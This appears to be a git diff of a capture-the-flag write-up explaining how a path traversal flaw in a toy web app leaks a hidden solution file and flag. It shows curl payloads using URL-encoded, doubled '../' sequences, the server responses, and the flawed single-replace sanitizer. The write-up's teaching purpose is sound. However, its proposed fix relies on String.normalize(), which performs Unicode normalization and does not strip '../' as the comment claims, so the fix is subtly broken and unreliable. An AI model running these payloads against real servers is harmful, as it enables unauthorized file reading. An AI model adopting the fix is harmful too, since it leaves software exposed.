@@ -51,8 +51,8 @@ In Nginx, for example, it's necessary to omit the trailing slash from the `proxy
 When inspecting the request made by the client to the backend we can gain some insights about the interactions. There are XHR calls to three endpoints:
 
 - `GET /templates`: retrieves all the blocks configuration
-- `GET /template/:type/code`:  called for each block, retrieves the template code for that block
-- `POST /template/:type/solution`: called when entering a solution password, tries to get the solution, returns 403 with wrong password
+- `GET /codes/:type`:  called for each block, retrieves the template code for that block
+- `POST /solutions/:type`: called when entering a solution password, tries to get the solution, returns 403 with wrong password
 
 ![requests](requests.png)
 
@@ -61,23 +61,68 @@ The big assumption that we have to make is about how the data is retrieved insid
 - If we have some kind of __database__ we may attack using SQL Injection
   - *We quickly rule out this hypothesis, since injecting any SQL string does not yields any effect*
 - If the developer was lazy enough we may think that he's __reading files__ directly from the disk, using the files API.
-  - If this is the case, we know that it's a pretty common mistake to not check the paths that we are reading. We assume no path escaping.
-  - Since we have endpoints for code and solutions, we assume two directories at the same level with the same names.
+  - If this is the case, we know that it's a pretty common mistake to not check the paths that we are reading properly.
+  - Since we have endpoints for codes and solutions, we assume two directories at the same level with the same names.
 
-Since it requires no password, we try to exploit the `GET /template/:type/code` HTTP command. We inject a path traversal, url escaped to prevent the router from failing to recognize it:
+Since it requires no password, we can try to exploit the `GET /template/:type/code` HTTP command. We try with a simple path traversal:
 
 ```bash
-curl https://test.giuliozausa.dev/template/..%2Fsolutions%2FChromaComposite/code
+curl http://localhost:8080/codes/../solutions/ChromaComposite
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot GET /solutions/ChromaComposite</pre>
+</body>
+</html>
 ```
 
-Response:
+With this response we realize that our `../` gets parsed by the application server router, so we need to urlescape it:
+
+```bash
+curl http://localhost:8080/codes/..%2Fsolutions%2FChromaComposite
+
+{"status":"error","error":"Error: No code found in path \"/Users/giuliozausa/personal/programming/challenge-cvedu/packages/backend/codes/solutions/ChromaComposite.ts\". Were you trying to perform a path traversal? We got path sanification."}
+```
+
+The server replies with an error: the file could not be found. This is because the server has some form of input sanification. Since we have the path readt from the error message, we can use it as an oracle to test how the sanification works.
+
+We quickly understand that the server is only removing the first occurrence `../`. This is a common mistake when using the JavaScript string API:
+
+```js
+// Removes path traversal
+if (name.includes("../")) {
+  name = name.replace("../", "");
+}
+
+const filePath = path.join(__dirname, basePath + `${folder}/`, name + ".ts");
+```
+
+The `replace("../", "")` function does not removes all the occurrencies, only the first one! We can exploit this behaviour using a double `../` in the start of path. This works even if we use the expected Node.JS `path` api.
+
+```bash
+curl http://localhost:8080/codes/..%2F..%2Fsolutions%2FChromaComposite
+```
+
+This command will succesfully read the desidered file, leaking the solution, with the challenge flag as reward:
 
 ```json
 {"status":"ok","data":"// Enjoy your green screen!\n// Flag: DOTDOTSLASH-GOES-BRRR\n\nfunction ChromaComposite({\n  Mask,\n  FrameA,\n  FrameB,\n}: {\n  Mask: { data: boolean[]; width: number; height: number };\n  FrameA: ImageData;\n  FrameB: ImageData;\n}): { Frame: ImageData } {\n  // Copia i pixel dell'immagine\n  const newData = new ImageData(FrameA.width, FrameA.height);\n\n  for (let i = 0; i < FrameA.data.length; i += 4) {\n    if (Mask.data[i / 4]) {\n      newData.data[i] = FrameA.data[i];\n      newData.data[i + 1] = FrameA.data[i + 1];\n      newData.data[i + 2] = FrameA.data[i + 2];\n    } else {\n      newData.data[i] = FrameB.data[i];\n      newData.data[i + 1] = FrameB.data[i + 1];\n      newData.data[i + 2] = FrameB.data[i + 2];\n    }\n\n    newData.data[i + 3] = 255;\n  }\n\n  return { Frame: newData };\n}\n"}
 ```
 
-We got our flag, that was hidden under a solution!
+## Fixing the vulnerability
 
-### Feedback from users
+There are many ways to fix this vulnerability. The most common is to sanitize the path using a base path that should not be escaped:
 
-I have let some users try the challenge to gather some insights about its difficulty. I have found out that, without the source code or any info about the server file-reading behaviour, it can be really difficult to solve. It may be a good idea to suggest the users the fact that the server is reading files in two folders: `codes` and `solutions`.
+```js
+function sanitizePath(base, str) {
+  // normalize() removes the ../ in the middle, then we remove any ../ from the front of the path
+  const normalized = str.normalize().replace(/^(\.\.(\/|\\|$))+/, '');
+  // we join the two paths
+  return path.join(base, normalized);
+}
+```
